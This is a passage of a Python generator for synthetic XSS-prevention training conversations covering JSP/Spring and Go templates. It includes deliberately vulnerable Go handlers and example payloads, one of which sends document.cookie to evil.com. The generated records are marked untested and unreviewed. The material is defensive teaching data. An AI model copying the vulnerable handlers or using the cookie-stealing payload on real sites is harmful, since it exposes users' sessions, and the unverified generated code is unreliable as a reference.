<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>
<html>
<head>
    <meta charset="UTF-8">
    <!-- Content Security Policy -->
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'">
</head>
<body>
    <!-- SECURE: c:out auto-escapes HTML -->
    <h1>Welcome <c:out value="${username}"/></h1>

    <!-- Alternative: fn:escapeXml -->
    <p>Bio: ${fn:escapeXml(userBio)}</p>
</body>
</html>

// JSP: comment.jsp (SECURE)
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<div class="comment">
    <!-- SECURE: Default escapeXml="true" -->
    <strong><c:out value="${username}"/></strong>:
    <c:out value="${commentText}"/>
</div>
```

**Key Security Controls:**
1. **JSTL c:out tag** - Auto-escapes HTML by default (escapeXml="true")
2. **Bean Validation** - @NotBlank, @Size constraints
3. **Never use <%= %>** - Always use JSTL tags
4. **HtmlUtils.htmlEscape()** - Manual escaping when needed
5. **OWASP Java HTML Sanitizer** - For rich content
6. **CSP meta tag** - Defense-in-depth protection"""
            },
            {
                "turn": 3,
                "from": "human",
                "value": "What if I need to allow rich HTML content like in a blog post editor?"
            },
            {
                "turn": 4,
                "from": "assistant",
                "value": """For rich content, use OWASP Java HTML Sanitizer with Spring Security integration:

```java
// Add dependency:
// <dependency>
//   <groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
//   <artifactId>owasp-java-html-sanitizer</artifactId>
//   <version>20220608.1</version>
// </dependency>

import org.owasp.html.*;
import org.springframework.stereotype.Service;
import org.springframework.web.util.HtmlUtils;

@Service
public class HtmlSanitizerService {

    private final PolicyFactory strictPolicy;
    private final PolicyFactory richContentPolicy;

    public HtmlSanitizerService() {
        // Strict policy for comments (minimal HTML)
        this.strictPolicy = new HtmlPolicyBuilder()
            .allowElements("b", "i", "em", "strong", "a", "p", "br")
            .allowAttributes("href", "title").onElements("a")
            .allowStandardUrlProtocols()
            .requireRelNofollowOnLinks()
            .toFactory();

        // Rich policy for blog posts
        this.richContentPolicy = new HtmlPolicyBuilder()
            .allowElements(
                "h1", "h2", "h3", "h4", "h5", "h6",
                "p", "br", "hr", "blockquote", "pre", "code",
                "b", "i", "em", "strong", "u", "s",
                "ul", "ol", "li",
                "a", "img",
                "table", "thead", "tbody", "tr", "th", "td"
            )
            .allowAttributes("href", "title").onElements("a")
            .allowAttributes("src", "alt", "title").onElements("img")
            .allowAttributes("colspan", "rowspan").onElements("td", "th")
            .allowStandardUrlProtocols()
            .allowUrlProtocols("https")
            .requireRelNofollowOnLinks()
            .toFactory();
    }

    public String sanitizeComment(String html) {
        return strictPolicy.sanitize(html);
    }

    public String sanitizeBlogPost(String html) {
        return richContentPolicy.sanitize(html);
    }
}

// Controller for blog posts
@Controller
@RequestMapping("/blog")
public class BlogController {

    @Autowired
    private HtmlSanitizerService sanitizer;

    @Autowired
    private BlogPostService blogPostService;

    // Display blog post
    @GetMapping("/post/{id}")
    public String showPost(@PathVariable Long id, Model model) {
        BlogPost post = blogPostService.findById(id);

        // Content is already sanitized when stored
        model.addAttribute("post", post);
        return "blog/post";
    }

    // Create blog post
    @PostMapping("/post")
    public String createPost(
        @Valid @ModelAttribute BlogPostDTO postDTO,
        BindingResult result,
        Model model
    ) {
        if (result.hasErrors()) {
            return "blog/edit";
        }

        // Sanitize HTML content before saving
        String sanitizedContent = sanitizer.sanitizeBlogPost(postDTO.getContent());

        BlogPost post = new BlogPost();
        post.setTitle(postDTO.getTitle());  // Plain text, will be escaped
        post.setContent(sanitizedContent);   // Sanitized HTML

        blogPostService.save(post);

        return "redirect:/blog/post/" + post.getId();
    }
}

// DTO with validation
public class BlogPostDTO {
    @NotBlank
    @Size(max = 200)
    private String title;

    @NotBlank
    @Size(max = 50000)
    private String content;

    // Getters and setters
}

// Entity
@Entity
public class BlogPost {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, length = 200)
    private String title;

    @Lob
    @Column(nullable = false)
    private String content;  // Stores sanitized HTML

    // Getters and setters
}

// JSP: blog/post.jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ taglib prefix="sec" uri="http://www.springframework.org/security/tags" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self';
                   script-src 'self';
                   style-src 'self' 'unsafe-inline';
                   img-src 'self' https:;
                   font-src 'self';
                   frame-ancestors 'none';">
    <title><c:out value="${post.title}"/></title>
</head>
<body>
    <article>
        <!-- Title: plain text, auto-escaped -->
        <h1><c:out value="${post.title}"/></h1>

        <!-- Content: sanitized HTML, safe to output -->
        <!-- Content is pre-sanitized, so escapeXml="false" is safe here -->
        <div class="blog-content">
            <c:out value="${post.content}" escapeXml="false"/>
        </div>
    </article>
</body>
</html>

// Spring Security Configuration
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; " +
                                    "script-src 'self'; " +
                                    "style-src 'self' 'unsafe-inline'; " +
                                    "img-src 'self' https:; " +
                                    "frame-ancestors 'none'")
                )
                .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
                .contentTypeOptions(Customizer.withDefaults())
                .frameOptions(frame -> frame.deny())
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/blog/**").permitAll()
                .anyRequest().authenticated()
            );

        return http.build();
    }
}

// Custom JSP tag for safe HTML output
package com.example.tags;

import javax.servlet.jsp.tagext.SimpleTagSupport;
import javax.servlet.jsp.JspException;
import java.io.IOException;

public class SafeHtmlTag extends SimpleTagSupport {
    private String value;
    private boolean allowRichContent = false;

    public void setValue(String value) {
        this.value = value;
    }

    public void setAllowRichContent(boolean allowRichContent) {
        this.allowRichContent = allowRichContent;
    }

    @Override
    public void doTag() throws JspException, IOException {
        if (value != null) {
            HtmlSanitizerService sanitizer = new HtmlSanitizerService();
            String safe = allowRichContent
                ? sanitizer.sanitizeBlogPost(value)
                : sanitizer.sanitizeComment(value);
            getJspContext().getOut().write(safe);
        }
    }
}

// TLD file: WEB-INF/tags/safe.tld
/*
<taglib>
    <tlib-version>1.0</tlib-version>
    <short-name>safe</short-name>
    <uri>http://example.com/tags/safe</uri>
    <tag>
        <name>html</name>
        <tag-class>com.example.tags.SafeHtmlTag</tag-class>
        <body-content>empty</body-content>
        <attribute>
            <name>value</name>
            <required>true</required>
            <rtexprvalue>true</rtexprvalue>
        </attribute>
        <attribute>
            <name>allowRichContent</name>
            <required>false</required>
            <rtexprvalue>true</rtexprvalue>
        </attribute>
    </tag>
</taglib>
*/

// Usage in JSP
<%@ taglib prefix="safe" uri="http://example.com/tags/safe" %>

<!-- For comments (strict sanitization) -->
<safe:html value="${userComment}"/>

<!-- For blog posts (rich sanitization) -->
<safe:html value="${blogPost.content}" allowRichContent="true"/>
```

**Security Pattern:**
- **OWASP Java HTML Sanitizer** - Industry-standard sanitization
- **Separate policies** - Different rules for comments vs. blog posts
- **Sanitize on input** - Clean before storage
- **Custom JSP tags** - Encapsulate sanitization logic
- **Spring Security headers** - CSP, X-XSS-Protection, X-Frame-Options
- **Bean Validation** - Input constraints (@Size, @NotBlank)

**Critical Java/Spring XSS Prevention Rules:**
1. Always use JSTL c:out or fn:escapeXml for output
2. Never use <%= %> scriptlets - deprecated and unsafe
3. Use OWASP Java HTML Sanitizer for rich content
4. Sanitize before storage (input validation)
5. Configure Spring Security headers (CSP, XSS protection)
6. Use Bean Validation for input constraints
7. Create custom JSP tags for reusable sanitization
8. Only use escapeXml="false" with pre-sanitized content"""
            }
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": datetime.now().strftime('%Y-%m-%d'),
            "issues": []
        }
    }


def go_html_template_xss():
    """Go - XSS with html/template package"""
    return {
        "id": "xss-000005",
        "metadata": create_base_metadata("go", 5),
        "context": {
            "real_world_incident": "2023 Go web applications vulnerable to template injection",
            "impact": "Multiple SaaS platforms compromised via XSS",
            "attack_vector": "Improper template usage with user input",
            "cve": None,
            "year": 2023
        },
        "conversations": [
            {
                "turn": 1,
                "from": "human",
                "value": "I'm building a Go web application using html/template. How do I safely display user-generated content?"
            },
            {
                "turn": 2,
                "from": "assistant",
                "value": """I'll show you both vulnerable and secure approaches in Go.

**Vulnerable Code (XSS Risk):**
```go
package main

import (
    "fmt"
    "html/template"
    "net/http"
)

// DANGEROUS: Using text/template instead of html/template
import texttemplate "text/template"

func handleProfileBad(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")

    // DANGEROUS: Direct string concatenation
    html := fmt.Sprintf("<h1>Welcome %s</h1>", name)
    w.Write([]byte(html))  // No escaping
}

// DANGEROUS: Using text/template (no auto-escaping)
func handleCommentBad(w http.ResponseWriter, r *http.Request) {
    comment := r.URL.Query().Get("comment")

    tmplStr := `<div class="comment">{{.}}</div>`

    // DANGEROUS: text/template doesn't escape HTML
    tmpl := texttemplate.Must(texttemplate.New("comment").Parse(tmplStr))
    tmpl.Execute(w, comment)  // XSS vulnerability
}

// DANGEROUS: Marking content as safe when it's not
func handleUnsafe(w http.ResponseWriter, r *http.Request) {
    userHtml := r.URL.Query().Get("html")

    tmpl := template.Must(template.New("page").Parse(`<div>{{.}}</div>`))

    // DANGEROUS: template.HTML bypasses escaping
    tmpl.Execute(w, template.HTML(userHtml))  // XSS if userHtml is malicious
}
```

**Why This Is Dangerous:**
Attackers inject malicious HTML:
```
name=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
comment=<img src=x onerror="alert(document.cookie)">
html=<iframe src="https://evil.com/phishing"></iframe>
```

**Secure Implementation:**
```go
package main

import (
    "html/template"
    "net/http"
    "net/url"
    "strings"
)

// SECURE: Use html/template with auto-escaping
func handleProfileSafe(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")

    // Validate input
    if len(name) > 100 {
        http.Error(w, "Name too long", http.StatusBadRequest)
        return
    }

    // html/template auto-escapes
    tmpl := template.Must(template.New("profile").Parse(`
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"></head>
        <body>
            <h1>Welcome {{.Name}}</h1>
        </body>
        </html>
    `))

    data := struct{ Name string }{Name: name}
    tmpl.Execute(w, data)  // Auto-escaped
}

// SECURE: Template with proper escaping
type Comment struct {
    Username string
    Text     string
    ID       int
}

func handleCommentSafe(w http.ResponseWriter, r *http.Request) {
    username := r.URL.Query().Get("username")
    text := r.URL.Query().Get("text")

    // Input validation
    if len(username) > 50 || len(text) > 1000 {
        http.Error(w, "Input too long", http.StatusBadRequest)
        return
    }

    comment := Comment{
        Username: username,
        Text:     text,
        ID:       123,
    }

    tmpl := template.Must(template.New("comment").Parse(`
        <div class="comment" data-id="{{.ID}}">
            <strong>{{.Username}}</strong>: {{.Text}}
        </div>
    `))

    tmpl.Execute(w, comment)  // All fields auto-escaped
}

// SECURE: URL sanitization
func sanitizeURL(rawURL string) string {
    // Parse URL
    parsed, err := url.Parse(rawURL)
    if err != nil {
        return "#"
    }

    // Only allow http and https
    if parsed.Scheme != "http" && parsed.Scheme != "https" {
        return "#"
    }

    return parsed.String()
}

func handleLink(w http.ResponseWriter, r *http.Request) {
    userURL := r.URL.Query().Get("url")
    safeURL := sanitizeURL(userURL)

    tmpl := template.Must(template.New("link").Parse(`
        <a href="{{.URL}}" target="_blank" rel="noopener noreferrer">
            Visit {{.Title}}
        </a>
    `))

    data := struct {
        URL   string
        Title string
    }{
        URL:   safeURL,
        Title: "External Site",
    }

    tmpl.Execute(w, data)
}
```

**Key Security Controls:**
1. **html/template package** - Auto-escapes HTML by default
2. **Never use text/template** - No HTML escaping
3. **Input validation** - Length limits
4. **URL sanitization** - Validate protocols
5. **Structured data** - Use structs instead of raw strings
6. **Never use template.HTML()** - Bypasses escaping unless content is truly safe"""
            },
            {
                "turn": 3,
                "from": "human",
                "value": "What if I need to allow rich HTML content like markdown rendering in comments?"
            },
            {
                "turn": 4,
                "from": "assistant",
                "value": """For rich content, use sanitization libraries with html/template:

```go
package main

import (
    "html/template"
    "net/http"
    "strings"

    "github.com/microcosm-cc/bluemonday"  // go get github.com/microcosm-cc/bluemonday
    "github.com/russross/blackfriday/v2"   // go get github.com/russross/blackfriday/v2
)

// HTML sanitizer service
type HtmlSanitizer struct {
    strictPolicy *bluemonday.Policy
    richPolicy   *bluemonday.Policy
}

func NewHtmlSanitizer() *HtmlSanitizer {
    // Strict policy for comments
    strict := bluemonday.NewPolicy()
    strict.AllowElements("b", "i", "em", "strong", "a", "p", "br")
    strict.AllowAttrs("href").OnElements("a")
    strict.AllowStandardURLs()
    strict.RequireNoFollowOnLinks(true)

    // Rich policy for blog posts
    rich := bluemonday.UGCPolicy()  // User Generated Content policy
    rich.AllowElements("h1", "h2", "h3", "p", "br", "code", "pre", "blockquote")

    return &HtmlSanitizer{
        strictPolicy: strict,
        richPolicy:   rich,
    }
}

func (s *HtmlSanitizer) SanitizeComment(html string) template.HTML {
    // Sanitize and mark as safe for templates
    return template.HTML(s.strictPolicy.Sanitize(html))
}

func (s *HtmlSanitizer) SanitizeBlogPost(html string) template.HTML {
    return template.HTML(s.richPolicy.Sanitize(html))
}

// Markdown renderer with sanitization
type MarkdownRenderer struct {
    sanitizer *HtmlSanitizer
}

func NewMarkdownRenderer() *MarkdownRenderer {
    return &MarkdownRenderer{
        sanitizer: NewHtmlSanitizer(),
    }
}

func (m *MarkdownRenderer) Render(markdown string) template.HTML {
    // Convert markdown to HTML
    rawHTML := blackfriday.Run([]byte(markdown))

    // Sanitize HTML output
    return m.sanitizer.SanitizeBlogPost(string(rawHTML))
}

// Comment system with rich content support
type CommentSystem struct {
    sanitizer *HtmlSanitizer
    renderer  *MarkdownRenderer
}

type CommentData struct {
    ID       int
    Username string
    Content  template.HTML  // Sanitized HTML
}

func NewCommentSystem() *CommentSystem {
    return &CommentSystem{
        sanitizer: NewHtmlSanitizer(),
        renderer:  NewMarkdownRenderer(),
    }
}

func (cs *CommentSystem) HandleComment(w http.ResponseWriter, r *http.Request) {
    username := r.FormValue("username")
    rawComment := r.FormValue("comment")
    format := r.FormValue("format")  // "html" or "markdown"

    // Input validation
    if len(username) > 50 || len(rawComment) > 5000 {
        http.Error(w, "Input too long", http.StatusBadRequest)
        return
    }

    // Sanitize based on format
    var sanitizedContent template.HTML
    if format == "markdown" {
        sanitizedContent = cs.renderer.Render(rawComment)
    } else {
        sanitizedContent = cs.sanitizer.SanitizeComment(rawComment)
    }

    comment := CommentData{
        ID:       123,
        Username: username,  // Will be auto-escaped
        Content:  sanitizedContent,  // Already sanitized
    }

    // Template with mixed escaping
    tmpl := template.Must(template.New("comment").Parse(`
        <div class="comment" data-id="{{.ID}}">
            <strong>{{.Username}}</strong>:
            <div class="content">{{.Content}}</div>
        </div>
    `))

    tmpl.Execute(w, comment)
}

// Blog post handler with CSP
func (cs *CommentSystem) HandleBlogPost(w http.ResponseWriter, r *http.Request) {
    // Set security headers
    w.Header().Set("Content-Security-Policy",
        "default-src 'self'; "+
        "script-src 'self'; "+
        "style-src 'self' 'unsafe-inline'; "+
        "img-src 'self' https:; "+
        "font-src 'self'; "+
        "frame-ancestors 'none'")
    w.Header().Set("X-Content-Type-Options", "nosniff")
    w.Header().Set("X-Frame-Options", "DENY")
    w.Header().Set("X-XSS-Protection", "1; mode=block")

    title := r.FormValue("title")
    markdown := r.FormValue("content")

    if len(title) > 200 || len(markdown) > 50000 {
        http.Error(w, "Input too long", http.StatusBadRequest)
        return
    }

    // Render markdown with sanitization
    sanitizedHTML := cs.renderer.Render(markdown)

    data := struct {
        Title   string
        Content template.HTML
    }{
        Title:   title,  // Auto-escaped
        Content: sanitizedHTML,  // Pre-sanitized
    }

    tmpl := template.Must(template.New("post").Parse(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>{{.Title}}</title>
        </head>
        <body>
            <article>
                <h1>{{.Title}}</h1>
                <div class="content">{{.Content}}</div>
            </article>
        </body>
        </html>
    `))

    tmpl.Execute(w, data)
}

// Template function helpers
func createTemplateFuncs() template.FuncMap {
    sanitizer := NewHtmlSanitizer()

    return template.FuncMap{
        // Sanitize HTML
        "sanitizeHtml": func(html string) template.HTML {
            return sanitizer.SanitizeComment(html)
        },

        // Truncate text safely
        "truncate": func(s string, maxLen int) string {
            if len(s) <= maxLen {
                return s
            }
            return s[:maxLen] + "..."
        },

        // Validate URL
        "safeURL": func(rawURL string) string {
            parsed, err := url.Parse(rawURL)
            if err != nil {
                return "#"
            }
            if parsed.Scheme != "http" && parsed.Scheme != "https" {
                return "#"
            }
            return parsed.String()
        },
    }
}

// Advanced template with custom functions
func handleAdvanced(w http.ResponseWriter, r *http.Request) {
    userHTML := r.FormValue("html")
    userURL := r.FormValue("url")

    tmpl := template.Must(template.New("advanced").Funcs(createTemplateFuncs()).Parse(`
        <div>
            <!-- Sanitize user HTML -->
            <div class="user-content">{{sanitizeHtml .HTML}}</div>

            <!-- Safe URL -->
            <a href="{{safeURL .URL}}">Link</a>

            <!-- Truncate text -->
            <p>{{truncate .HTML 100}}</p>
        </div>
    `))

    data := struct {
        HTML string
        URL  string
    }{
        HTML: userHTML,
        URL:  userURL,
    }

    tmpl.Execute(w, data)
}

// Middleware for security headers
func securityHeadersMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy",
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("X-XSS-Protection", "1; mode=block")

        next.ServeHTTP(w, r)
    })
}

func main() {
    cs := NewCommentSystem()

    http.HandleFunc("/comment", cs.HandleComment)
    http.HandleFunc("/blog", cs.HandleBlogPost)
    http.HandleFunc("/advanced", handleAdvanced)

    // Wrap with security headers
    handler := securityHeadersMiddleware(http.DefaultServeMux)

    http.ListenAndServe(":8080", handler)
}
```

**Security Pattern:**
- **bluemonday library** - Industry-standard HTML sanitization
- **Separate policies** - Strict for comments, rich for blog posts
- **Markdown sanitization** - Render then sanitize
- **Template functions** - Reusable sanitization logic
- **Security headers middleware** - Apply CSP to all responses
- **template.HTML type** - Only use with pre-sanitized content
- **Input validation** - Length limits on all user input

**Critical Go XSS Prevention Rules:**
1. Always use html/template, never text/template for HTML output
2. Only use template.HTML with pre-sanitized content
3. Use bluemonday for HTML sanitization with strict policies
4. Validate URLs before using in href/src attributes
5. Set Content-Security-Policy headers
6. Create template functions for reusable sanitization
7. Sanitize markdown output after rendering
8. Use middleware for consistent security headers"""
            }
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": datetime.now().strftime('%Y-%m-%d'),
            "issues": []
        }
    }


def generate_all_examples():
    """Generate all XSS examples"""
    examples = [
        javascript_dom_xss(),
        react_xss(),
        php_server_side_xss(),
        java_spring_mvc_xss(),
        go_html_template_xss(),
    ]

    return examples


if __name__ == '__main__':
    examples = generate_all_examples()

    # Save to JSONL file
    output_file = Path(__file__).parent.parent / 'data' / 'xss_batch_003.jsonl'
    output_file.parent.mkdir(parents=True, exist_ok=True)

    with open(output_file, 'w') as f:
        for example in examples:
            f.write(json.dumps(example, indent=None) + '\n')

    print(f"✓ Generated {len(examples)} XSS examples")
    print(f"✓ Saved to: {output_file}")
    print("\nExamples:")
    for ex in examples:
        lang = ex['metadata']['lang']
        turns = len(ex['conversations'])
        context = ex.get('context', {}).get('cve', 'N/A')
        print(f"  - {ex['id']}: {lang} / {turns} turns / CVE: {context}")
